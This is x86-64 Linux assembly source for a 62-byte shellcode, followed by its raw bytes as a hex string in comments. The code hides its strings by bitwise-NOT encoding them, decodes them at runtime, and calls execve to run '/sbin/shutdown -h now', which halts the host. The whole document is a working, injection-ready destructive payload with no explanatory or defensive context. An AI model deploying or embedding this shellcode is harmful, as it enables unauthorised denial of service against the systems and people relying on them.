global _start
section .TEXT exec write

_start:
	xor rdx, rdx
	push rdx ; NULL to terminate arg array

	jmp _str ; Get addr of strings in RAX
_build:
	pop rax  

; Load string addresses onto stack
	push rax           ; 'now'
	lea rdi, [rax+4]   ; '-h'
	push rdi
	lea rdi, [rax+7]   ; '/sbin/shutdown'
	push rdi
	push rsp           ; Save arg array addr
	pop rsi

; Decode strings
	push 0x16
	pop rcx
_decode:
	not byte [rax]
	inc rax
	loop _decode

	push 0x3b
	pop rax
	syscall

_str:
	call _build
_now: db 0x91, 0x90, 0x88, 0xff
_h:   db 0xd2, 0x97, 0xff
_cmd: db 0xd0, 0x8c, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0x8a, 0x8b, 0x9b, 0x90, 0x88, 0x91, 0xff

; Shellcode - 62 bytes
; "\x48\x31\xd2\x52\xeb\x1d\x58\x50\x48\x8d\x78"
; "\x04\x57\x48\x8d\x78\x07\x57\x54\x5e\x6a\x16"
; "\x59\xf6\x10\x48\xff\xc0\xe2\xf9\x6a\x3b\x58"
; "\x0f\x05\xe8\xde\xff\xff\xff\x91\x90\x88\xff"
; "\xd2\x97\xff\xd0\x8c\x9d\x96\x91\xd0\x8c\x97"
; "\x8a\x8b\x9b\x90\x88\x91\xff";
